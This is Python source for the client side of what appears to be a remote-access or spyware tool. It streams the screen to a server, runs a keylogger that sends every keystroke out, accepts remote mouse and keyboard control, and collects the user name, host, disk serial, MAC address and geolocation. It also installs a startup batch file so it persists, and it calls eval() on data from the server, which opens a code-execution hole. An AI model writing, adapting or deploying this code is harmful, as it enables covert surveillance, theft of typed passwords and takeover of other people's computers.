from Base.constants import ImageSendModes, DeviceEvents, Reasons, \
    ClientTypes, ControlDevice, Actions, Identity
from Base.settings import ACKNOWLEDGEMENT_ITERATION, \
    SERVER_PORT, SERVER_ADDRESS, IMAGE_SEND_MODE
from Base.socket_base import Socket, Config
import itertools as it
import json
import logging
from math import log
import os
from PIL import Image, ImageChops
from pynput.mouse import Controller as MouseController, Button as MouseButton
from pynput.keyboard import Controller as KeyController, Key, KeyCode, \
    Listener as KeyboardListener
from queue import Queue, Empty
from random import random
from socket import SHUT_RDWR, gethostname
import subprocess
from threading import Thread
from time import sleep, time
import traceback
from typing import Dict, List, Tuple, Union
from uuid import getnode
import platform


try:
    from mss import mss
except ImportError:
    logging.warning("Cannot import mss")

try:
    import gi
    gi.require_version("Gdk", "3.0")
    from gi.repository import Gdk
    from gi.overrides.GdkPixbuf import Pixbuf
except:
    logging.warning("Cannot import gi")


class BaseTarget(Socket):
    """
    The base class which all target components inherit.
    """

    config = Config()

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.client_type: bytes

    def reset(self):
        self.socket.close()
        self.socket = self.new_socket()

    def start(self):
        name = self.__class__.__name__
        logging.info(f"Starting {name}")
        self.reset()
        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return

        try:
            self.send_data(self.client_type)
            self.send_data(self.config.code.encode(self.FORMAT))
            data = self.recv_data()
        except (BrokenPipeError, ConnectionResetError):
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return

        if data == Reasons.ALREADY_CONNECTED:
            logging.info("Already connected. stoping!")
            self.stop()
            return
        if data == Reasons.MAIN_NOT_CONNECTED:
            logging.info("Main not connected. stoping!")
            self.stop()
            return
        if data != b"OK":
            logging.info(f"Unknown error. stoping! Received code {data}")
            self.stop()
            return

    def run(self):
        raise NotImplementedError

    def stop(self, args=None):
        raise NotImplementedError


class Target(BaseTarget):

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.autostart = AutoStart()

        self.components: Dict[bytes, BaseTarget] = {
            ClientTypes.TARGET_SCREEN_READER: ScreenReader(),
            ClientTypes.TARGET_CONTROLLER: Controller(),
            ClientTypes.TARGET_KEYLOGGER: KeyLogger()
        }

    @property
    def active_components(self) -> List[BaseTarget]:
        return filter(lambda component: component.running,
                      self.components.values())

    def start_all(self):
        """
            Starts all the target components.
        """
        for component in self.components.keys():
            self.start_component(component)

    def start_component(self, component: bytes):
        if self.components[component] not in self.active_components:
            Thread(target=self.components[component].start).start()

    def stop_component(self, component: bytes):
        self.components[component].stop()

    def run(self):
        """
            Run a loop which connects to the server and waits for watcher 
            clients.
            Stops if another client for this target is already connected

            TODO: Support selective watching: Do not start all the readers,
                controllers and listeners at once. Start only the ones
                requested by the watcher.
        """
        while self.running:
            try:
                self.socket.close()
                self.socket = self.new_socket()
                logging.info("Connecting")
                self.connect()
                logging.info("Connected")

                self.send_data(ClientTypes.TARGET)
                # Send unique code
                self.send_data(self.config.code.encode(self.FORMAT))
                self.send_identity()
                data = self.recv_data()
                if data == Reasons.ALREADY_CONNECTED:
                    logging.info("Another client with same target"
                    " code is already connected. Exiting.")
                    # sleep(2)
                    self.stop()
                elif data == b"OK":
                    while self.running:
                        data = self.recv_data()
                        if data == Actions.WAIT:
                            self.send_data(b"OK")
                            pass    # simply wait
                        elif data == Actions.START_ALL_COMPONENTS:
                            logging.info("Starting All Components")
                            self.start_all()
                        elif data == Actions.START_SCREEN_READER:
                            self.start_component(ClientTypes.
                                                 TARGET_SCREEN_READER)
                        elif data == Actions.START_CONTROLLER:
                            self.start_component(ClientTypes.
                                                 TARGET_CONTROLLER)
                        elif data == Actions.START_KEYLOGGER:
                            self.start_component(ClientTypes.
                                                 TARGET_KEYLOGGER)
                        elif data == Actions.STOP_ALL_COMPONENTS:
                            for component in self.components:
                                self.stop_component(component)
                        elif data == Actions.STOP_SCREEN_READER:
                            self.stop_component(ClientTypes.
                                                TARGET_SCREEN_READER)
                        elif data == Actions.STOP_CONTROLLER:
                            self.stop_component(ClientTypes.
                                                TARGET_CONTROLLER)
                        elif data == Actions.STOP_KEYLOGGER:
                            self.stop_component(ClientTypes.
                                                TARGET_KEYLOGGER)
                        elif data == Actions.DISCONNECT:
                            break
                        else:
                            raise ValueError(f"Undefined action '{data}'")
                self.socket.close()
                logging.info("Disconnected. Stopped sending Target data.")

            except TimeoutError:
                logging.critical("Connection Timed Out")
            except (BrokenPipeError, ConnectionResetError):
                logging.critical("Disconnected. Trying to reconnect in 2 sec")
                sleep(2)
            except ConnectionRefusedError:
                logging.critical("Connection refused. Retrying in 2 sec")
                sleep(2)
            except OSError:
                logging.fatal(f"OSError Occured\n"
                    f"{traceback.format_exc()}\n")
            except KeyboardInterrupt:
                self.stop()
                print("stopped due to keyboard interrupt")
                return
            sleep(1)

    def get_identity(self):
        user = os.getlogin().encode(self.FORMAT)
        host = gethostname().encode(self.FORMAT)
        platform = self.platform.encode(self.FORMAT)

        # TODO: Handle the situation where sda is present in place of nvme0n1
        if 'linux' in self.platform:
            try:
                hdd_serial = list(filter(lambda x: b"ID_SERIAL=" in x, subprocess.run(
                    ["udevadm", "info", "--query=all", "--name=/dev/nvme0n1"],
                    capture_output=True
                ).stdout.split(b"\n")))[0].split(b"=")[1]
            except:
                hdd_serial = b""
        else:
            hdd_serial = b""
        
        try:
            geolocation = subprocess.run(["curl", "-s", "ipinfo.io/loc"],
                                    capture_output=True).stdout.strip()
        except:
            geolocation = ""

        wifi_mac = getnode()  # handle the situation where no wifi is present

        identity = {
            Identity.USER: user,
            Identity.HOST: host,
            Identity.PLATFORM: platform,
            Identity.HDD_SERIAL: hdd_serial,
            Identity.WIFI_MAC: wifi_mac,
            Identity.GEOLOCATION: geolocation
        }

        return identity

    def send_identity(self):
        identity = self.get_identity()

        self.send_data(str(identity).encode(self.FORMAT))

    def start(self):
        """
            The main start function. Use this to start the target client
        """
        if not self.running:
            self.running = True
            self.autostart_thread = Thread(target=self.autostart.configure)
            self.autostart_thread.start()
            self.run()

    def stop(self, args=None):
        """
            Stop this target client and exit

            Note: This function invokes the `stop` function of each component
                  with the value received from the server as an anrgument.
                  These arguments are processed by the functions. The function
                  decides if any children components need to be stopped
        """
        self.running = False
        self.autostart.stop()
        # if hasattr(self, "controller"):
        #     self.controller.stop()
        # if hasattr(self, "keylogger"):
        #     self.keylogger.stop()
        logging.debug("Stopping Target")
        # logging.debug(str(self.active_components))
        try:
            self.send_data(Actions.DISCONNECT)
        except (BrokenPipeError, ConnectionResetError):
            logging.debug("Can't send disconnect request")
        self.socket.close()
        for component in self.active_components:
            component.stop(args)            


class ScreenReader(BaseTarget):

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.reset()
        self.client_type = ClientTypes.TARGET_SCREEN_READER

    def reset(self):
        super().reset()
        self.prev_img = None
        self.mss = None

    def start(self):
        super().start()

        self.running = True
        try:
            self.run()
        finally:
            self.stop()
            logging.info("Stopped screen reader client")

    def run(self):
        i = 0
        self.running = True
        while self.running:
            i+=1
            self.running = self.send_screenshot(i)
            i %= ACKNOWLEDGEMENT_ITERATION

    def send_screenshot(self, i) -> bool:
        """ 
            Returns True if the screenshot was successfully 
            sent, False otherwise

            Analysis of time required to
            send over network > convert to bytes > take screenshot
            TODO: (optional) Resize image according to network speed 
            to maintain framerate
        """
        t1 = time()
        img = self.take_screenshot()

        if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
            img_bin = self.image2bin(img)
        elif IMAGE_SEND_MODE == ImageSendModes.DIFF:
            if self.prev_img is None:
                diff = img
            else:
                diff = ImageChops.subtract_modulo(self.prev_img, img)
            # diff = Image.fromarray(np.array(diff))
            self.prev_img = img
            # t1_2 = time()
            img_bin = self.image2bin(diff)
        elif IMAGE_SEND_MODE == ImageSendModes.CHANGES:
            # TODO: Complete this option
            if self.prev_img is None:
                self.prev_img = img
                img_bins = [([0, 0, *Mouse.get_screen_size()], 
                    self.image2bin(img))]
            else:
                img_bins = self.get_all_diffs()
        try:
            # t2 = time()
            if IMAGE_SEND_MODE in (ImageSendModes.DIFF,
                                   ImageSendModes.DIRECT_JPG):
                self.send_data(img_bin)  # send the image
                # logging.debug(f"{len(img_bin)/1024}")

            if i==ACKNOWLEDGEMENT_ITERATION:
                res = self.recv_data()
                if res == Actions.DISCONNECT:
                    return False
            t3 = time()

            # to eat less cpu
            if t3-t1 < 0.4:
                sleep(0.1)
            # logging.debug(f"{t1_2-t1} {t2-t1_2}, {t3-t2}, "
            #               f"{len(img_bin)/1024}, {i}")
        except (ConnectionResetError, BrokenPipeError, OSError):
            return False
        return True

    def get_all_diffs(self, prev_img, img):
        pass

    def stop(self, args=None) -> None:
        """
            Stop the screen reader. No extra thread was run by this class
            so only closing socket.
        """
        self.running = False
        self.socket.close()

    def take_screenshot(self) -> Image:
        """
            Generic screenshot function that uses screenshot 
            tool based on platform.
        """
        if 'linux' in self.platform:
            img = self.take_screenshot_mss()
            # img = self.take_screenshot_pygobject()
            # img = self.take_screenshot_PIL()
            img.save("img.jpg")
        elif "windows" in self.platform:
            img = self.take_screenshot_mss()
        else:
            img = self.take_screenshot_PIL()

        return img

    def take_screenshot_pygobject(self) -> Image:
        """
            Take screenshot using PyGobject.
            Tested on Gnome only. Might not work on other desktop environments.
        """
        window = Gdk.get_default_root_window()
        x, y, width, height = window.get_geometry()
        pb: Pixbuf = Gdk.pixbuf_get_from_window(window, x, y, width, height)
        img = self.pixbuf2image(pb)
        img = img.resize((img.size[0]//2, img.size[1]//2), Image.ANTIALIAS)
        return img

    def pixbuf2image(self, pix) -> Image:
        """Convert gdkpixbuf to PIL image"""
        data = pix.get_pixels()
        w = pix.props.width
        h = pix.props.height
        stride = pix.props.rowstride
        mode = "RGB"
        if pix.props.has_alpha == True:
            mode = "RGBA"
        img = Image.frombytes(mode, (w, h), data, "raw", mode, stride)
        return img

    def image2bin(self, img: Image) -> bytes:
        """
            Convert PIL Image to bytes
        """
        import io
        bio = io.BytesIO()
        if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
            img.save(bio, format="JPEG", quality=15)
        else:
            img.save(bio, format=self.config.IMG_FORMAT)
        return bio.getvalue()

    def pixbuf_to_bin(self, pb) -> bytes:
        """
            Convert gdkpixbuf to binary
        """
        return self.image2bin(self.pixbuf2image(pb))

    def take_screenshot_PIL(self) -> Image:
        """
            Take screenshot using PIL
            Works on most platforms but is damn slow.
        """
        from PIL import ImageGrab
        return ImageGrab.grab()

    def take_screenshot_mss(self, resize_factor=1) -> Image:
        """
            Take a screenshot using mss package.
            mss screenshot is 3x faster than gi screenshot.
            TODO: test on other platforms also
        """
        if self.mss is None:
            self.mss = mss()
        img = self.mss.grab(self.mss.monitors[0])
        pilImg = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
        # pilImg = pilImg.resize((int(pilImg.size[0]*resize_factor), 
        #     int(pilImg.size[1]*resize_factor)), Image.Resampling.LANCZOS)
        return pilImg


class Controller(BaseTarget):
    """
    The class to control keyboard and mouse

    Note: The keyboard and mouse controller can be enabled or disabled
          separately on watcher side but this single controller
          controls them both on target side
    """

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.reset()
        self.client_type = ClientTypes.TARGET_CONTROLLER

    def reset(self):
        super().reset()
        self.mouse = Mouse()
        self.keyboard = Keyboard()

    def start(self):
        """
            Initiate connection to server.
        """
        super().start()

        Thread(target=self.run_update_loop).start()
        self.running = True
        try:
            self.run()
        finally:
            self.stop()
            logging.info("Stopped controller client")

    def run(self):
        while self.running:
            try:
                ctrl_ev = self.recv_data()
                if not ctrl_ev:
                    break
                control_type, *event = eval(ctrl_ev)

                if control_type == ControlDevice.CONTROL_MOUSE:
                    self.mouse.events.put(event)
                elif control_type == ControlDevice.CONTROL_KEYBOARD:
                    self.keyboard.events.put(event)
                else:
                    raise ValueError(f"Unknown control type '{control_type}'")
            except (BrokenPipeError, ConnectionResetError, SyntaxError):
                logging.info("Controller client disconnected")
                break
            sleep(0.001)

    def run_update_loop(self):
        """
            Runs the loop that runs update for each controller
        """
        logging.info("Starting update loop")
        self.running = True
        while self.running:
            self.mouse.update()
            self.keyboard.update()
            sleep(0.001)

    def stop(self, args=None):
        self.running = False
        # self.socket.shutdown(SHUT_RDWR)
        self.socket.close()


class Keyboard(object):
    """
        TODO: Release all pressed keys (if still remained pressed)
        when exiting
    """

    def __init__(self) -> None:
        self.key_controller = KeyController()
        self.events: Queue[List[int, int]] = Queue()

    def update(self):
        if self.events.empty():
            return
        ev_type, vk = self.events.get()
        if ev_type == DeviceEvents.KEY_DOWN:
            self.key_controller.press(KeyCode.from_vk(vk))
        elif ev_type == DeviceEvents.KEY_UP:
            self.key_controller.release(KeyCode.from_vk(vk))


class Mouse(object):

    def __init__(self) -> None:
        self.mouse_controller = MouseController()
        self.events: Queue[List[int, str, Tuple]] = Queue()
        self.screen_size = self.get_screen_size()
        self.platform = platform.platform().lower()
        logging.debug(f"screen size: {self.screen_size}")
        self.btns = {
            "left": MouseButton.left,
            "right": MouseButton.right,
            "middle": MouseButton.middle,
        }

        if "linux" in self.platform:
            self.btns.update({
                "scrolldown": MouseButton.scroll_down,
                "scrollup": MouseButton.scroll_up,
                "scrollleft": MouseButton.scroll_left,
                "scrollright": MouseButton.scroll_right,
            })

    def update(self):
        """
            Fetch mouse control requests from queue and handle them.
        """
        if self.events.empty():
            return
        self.screen_size = self.get_screen_size()
        ev_type, btn, rel_pos = self.events.get()
        pos = (
            rel_pos[0]*self.screen_size[0],
            (1-rel_pos[1])*self.screen_size[1]
        )
        self.mouse_controller.position = pos
        if ev_type == DeviceEvents.MOUSE_DOWN:
            self.mouse_controller.press(self.btns[btn])
        elif ev_type == DeviceEvents.MOUSE_UP:
            self.mouse_controller.release(self.btns[btn])

    def get_events(self):
        """
            Fetches requests from queue and returns them as a list
        """
        clicks = []
        while not self.events.empty():
            try:
                clicks.append(self.events.get_nowait())
            except Empty:
                break
        return clicks

    @staticmethod
    def get_screen_size():
        """
            Returns the resolution of the screen
        """
        # return list(pg.size())
        try:
            m = mss()
            mon = m.monitors[0]
            return [mon['width'], mon['height']]
        except NameError:   # mss not imported
            cmd = ['xrandr']
            cmd2 = ['grep', '*']
            xrandr = subprocess.Popen(cmd, stdout=subprocess.PIPE)
            grep = subprocess.Popen(cmd2, stdin=xrandr.stdout, 
                stdout=subprocess.PIPE)
            res, _ = grep.communicate()
            resolution = res.split()[0].decode("utf-8")
            return [int(i) for i in resolution.split('x')]


class KeyLogger(BaseTarget):
    """
        send all keys pressed to the server`
    """

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.listener = KeyboardListener(on_press=self.on_key_press,
                                         on_release=self.on_key_release)
        self.vks: Queue[Tuple[int, int]] = Queue()
        self.client_type = ClientTypes.TARGET_KEYLOGGER

    def on_key_press(self, key: Union[Key, KeyCode, None]):
        if isinstance(key, Key):
            key = key.value
        self.vks.put((DeviceEvents.KEY_DOWN, key.vk))

    def on_key_release(self, key: Union[Key, KeyCode, None]):
        if isinstance(key, Key):
            key = key.value
        self.vks.put((DeviceEvents.KEY_UP, key.vk))

    def reset(self):
        super().reset()
        self.listener.stop()
        self.vks = Queue()
        self.listener = KeyboardListener(on_press=self.on_key_press,
                                         on_release=self.on_key_release)

    def start(self):
        """
            Start the keylogger. Connect to the server.
        """
        super().start()

        self.running = True
        self.listener.start()
        try:
            self.run()
        finally:
            self.stop()
            logging.info("Stopped Keylogger")

    def run(self):
        """
            Send the logged keys to the server.
        """
        while self.running:
            try:
                if self.vks.empty():
                    self.send_data(Actions.WAIT)
                    # logging.debug("Waiting")
                    sleep(0.1)
                    continue

                vks = b"\0".join(map(
                    lambda x: x.to_bytes(int(log(x, 256)) + 1, "big"),
                    it.chain(*self.get_keys())
                ))
                # logging.debug(vks)
                self.send_data(vks)
            except (ConnectionResetError, BrokenPipeError):
                break

    def get_keys(self) -> Tuple[Tuple[int, int]]:
        """
            Fetches requests from queue and returns them as a list
        """
        keys = []
        while not self.vks.empty():
            try:
                keys.append(self.vks.get_nowait())
            except Empty:
                break
        return tuple(keys)

    def stop(self, args=None):
        self.running = False
        self.socket.close()
        self.listener.stop()


class AutoStart(object):

    """
    Setup autostart for the target executable
    """

    def __init__(self) -> None:
        self.running = False

    def configure(self):
        self.running = True
        if "windows" in platform.platform().lower():
            while self.running:
                if not os.path.exists("filename.txt"):
                    cur_dir = os.path.abspath(".")
                    files = os.listdir(cur_dir)
                    path = list(filter(lambda x: x.lower().endswith(".exe"), files))
                    if not path:
                        logging.debug(f"{cur_dir} does not contain any exe")
                        break
                    path = path[0]
                    with open("filename.txt", "w") as f:
                        f.write(f"{cur_dir}\\{path}")
                with open("filename.txt") as f:
                    path = f.read()

                self.startup_folder_windows(path)
                sleep(1)

        elif "linux" in platform.platform().lower():
            while self.running:
                if not os.path.exists("filename.txt"):
                    logging.debug("filename.txt not found")
                    break

                with open("filename.txt") as f:
                    path = f.read()
                
                s = self.startup_folder_linux(path)
                c = self.cronjob_linux(path)
                self.running = s or c

                sleep(1)

    def startup_folder_windows(self, path: str):
        user = os.path.expanduser("~")
        folder = os.path.join(user, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        bat_file = os.path.join(folder, "monitor.bat")
        if not os.path.exists(bat_file):
            logging.info(f"created autostart bat file {bat_file}")
        with open(bat_file, "w") as f:
            f.write(f"cd /d {os.path.dirname(path)}\n")
            f.write(f"start {path}")
        return True

    def startup_folder_linux(self, path: str):
        pass

    def cronjob_linux(self, path: str):

        return False

    def stop(self):
        self.running = False


def check_update():
    """
        check for updates
        matches current version of code to the one present on the server
        if they are different then download target again
        returns true if there are updates
    """

    pass


if __name__ == "__main__":
    if check_update():
        print("exiting due to update")
        exit(0)

    # start the main process
    logging.info("Starting target")
    target = Target()
    try:
        target.start()
    except KeyboardInterrupt:
        target.stop()

    logging.info("Stopped Target.")